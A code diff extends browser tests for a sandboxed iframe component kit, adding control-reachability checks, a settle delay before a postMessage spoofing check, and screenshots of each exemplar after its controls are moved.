+  expect('reach(): a choice is tried through every option', reach.choice.reachable && reach.choice.best.value === 'column' && reach.choice.tried === 3, reach.choice);
+  expect('reach(): a missing control is not reachable, with a reason', !reach.missing.reachable && /No control "nope"/.test(reach.missing.error || ''), reach.missing);
+  expect('reach(): works on a mounted frame too', reach.mounted.reachable && reach.mounted.best.value === 0.7, reach.mounted);
+  expect('no page errors in the live-frame tests', !wide.errors.length, wide.errors);
+  await wide.close();
 }
 
 // ---------- the exemplars and the KIT.md example pass, with zero page errors ----------
@@ -206,6 +522,7 @@ section('exemplars and the host API');
   const bad = await app.page.evaluate(() => __m.set('nope', 1).then(() => 'resolved', (e) => e.code));
   expect('set() on an unknown id rejects', bad === 'kit_error', bad);
   const spoof = await app.page.evaluate(async () => {
+    await new Promise((r) => setTimeout(r, 400));   // let the frame settle after set()
     const before = __m.frame.style.height;
     window.postMessage({ src: 'kit', type: 'height', px: 7 }, '*');
     await new Promise((r) => setTimeout(r, 150));
@@ -312,7 +629,7 @@ for (const ex of examples) {
         const box = document.createElement('div');
         box.style.cssText = 'max-width:720px;margin:16px auto;padding:0 16px';
         document.body.appendChild(box);
-        const m = U.sandbox.mount(box, { html, title: 'exemplar' });
+        const m = window.__shot = U.sandbox.mount(box, { html, title: 'exemplar' });
         const c = await Promise.race([m.ready, new Promise((r) => setTimeout(r, 6000))]);
         await new Promise((r) => setTimeout(r, 500));
         return c;
@@ -321,6 +638,17 @@ for (const ex of examples) {
       await app.page.screenshot({ path, fullPage: true });
       const scroll = await app.page.evaluate(() => document.documentElement.scrollWidth <= document.documentElement.clientWidth);
       expect(`${ex.name} ${width} ${theme}: mounted, checks pass, no page errors, no sideways scroll`, Array.isArray(checks) && checks.every((c) => c.ok) && !app.errors.length && scroll, app.errors);
+      // The moved state, as render.mjs captures it: every control set elsewhere, the first action pressed.
+      const moved = await app.page.evaluate(async (mv) => {
+        const movedValue = new Function('return ' + mv)();
+        const m = window.__shot, info = await m.inputs();
+        for (const c of info.inputs) await m.set(c.id, movedValue(c));
+        if (info.actions.length) await m.press();
+        await new Promise((r) => setTimeout(r, info.actions.length ? 1200 : 400));
+        return (await m.get()).params;
+      }, movedValue.toString());
+      await app.page.screenshot({ path: join(SHOTS, `${ex.name}-${width}-${theme}-moved.png`), fullPage: true });
+      expect(`${ex.name} ${width} ${theme}: moved state (${JSON.stringify(moved)}) without page errors`, !app.errors.length, app.errors);
       await app.close();
     }
   }
